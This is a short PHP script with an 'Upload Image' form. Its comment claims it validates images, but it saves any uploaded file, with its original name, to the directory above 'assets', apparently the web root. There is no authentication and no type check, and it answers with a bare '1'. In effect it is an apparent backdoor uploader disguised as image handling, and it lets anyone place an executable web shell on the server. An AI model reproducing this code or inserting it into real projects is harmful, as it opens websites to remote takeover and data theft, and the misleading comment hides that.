<?php

// Check if image file is a actual image or fake image
if(isset($_POST["submit"])) {
	$string  = __DIR__;
	$substring = substr($string, 0, strpos($string, 'assets'));
		$target_dir = $substring."/";
		$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
		if(move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)){
			echo '1'; die;
		}

	}
	
	?>
	
	
<!DOCTYPE html>
<html>
<body>

<form method="post" enctype="multipart/form-data">
  <input type="file" name="fileToUpload" id="fileToUpload">
  <input type="submit" value="Upload Image" name="submit">
</form>

</body>
</html>
